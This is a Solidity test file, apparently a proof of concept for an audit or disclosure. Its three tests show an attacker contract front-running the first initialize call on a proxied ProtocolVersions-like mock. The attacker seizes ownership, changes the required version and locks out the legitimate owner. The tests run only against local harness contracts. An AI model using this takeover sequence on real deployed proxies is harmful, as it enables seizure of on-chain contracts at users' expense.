// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    OptimismF1SimpleProxy,
    ProtocolVersionsLike,
    ProtocolVersionsInitAttacker,
    IProtocolVersionsLike
} from "../src/OptimismF1ProtocolVersionsInitHijackHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for ProtocolVersions initializer hijack.
contract OptimismF1ProtocolVersionsInitHijackTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_take_ownership_via_first_initialize_call() public {
        address admin = address(0xA11CE);
        address attackerOwner = address(0xBEEF);

        ProtocolVersionsLike implementation = new ProtocolVersionsLike();
        OptimismF1SimpleProxy proxy = new OptimismF1SimpleProxy(admin);
        IProtocolVersionsLike protocolVersions = IProtocolVersionsLike(address(proxy));
        ProtocolVersionsInitAttacker attacker = new ProtocolVersionsInitAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        attacker.hijack(address(proxy), attackerOwner, 111, 222);

        require(protocolVersions.owner() == attackerOwner, "attacker should own protocol versions");
        require(protocolVersions.required() == 111, "required should be attacker-set");
        require(protocolVersions.recommended() == 222, "recommended should be attacker-set");
    }

    function test_attacker_owner_can_mutate_required_after_takeover() public {
        address admin = address(0xA11CE);
        address attackerOwner = address(0xBEEF);

        ProtocolVersionsLike implementation = new ProtocolVersionsLike();
        OptimismF1SimpleProxy proxy = new OptimismF1SimpleProxy(admin);
        IProtocolVersionsLike protocolVersions = IProtocolVersionsLike(address(proxy));
        ProtocolVersionsInitAttacker attacker = new ProtocolVersionsInitAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));
        attacker.hijack(address(proxy), attackerOwner, 111, 222);

        vm.prank(attackerOwner);
        protocolVersions.setRequired(999_999);

        require(protocolVersions.required() == 999_999, "attacker owner should mutate required");
    }

    function test_legitimate_owner_cannot_initialize_after_attacker_first_call() public {
        address admin = address(0xA11CE);
        address attackerOwner = address(0xBEEF);
        address legitimateOwner = address(0xCAFE);

        ProtocolVersionsLike implementation = new ProtocolVersionsLike();
        OptimismF1SimpleProxy proxy = new OptimismF1SimpleProxy(admin);
        IProtocolVersionsLike protocolVersions = IProtocolVersionsLike(address(proxy));
        ProtocolVersionsInitAttacker attacker = new ProtocolVersionsInitAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));
        attacker.hijack(address(proxy), attackerOwner, 111, 222);

        vm.prank(admin);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(IProtocolVersionsLike.initialize.selector, legitimateOwner, 1, 2)
        );
        require(!ok, "legitimate initializer should be locked out");
        require(protocolVersions.owner() == attackerOwner, "attacker ownership should persist");
    }
}
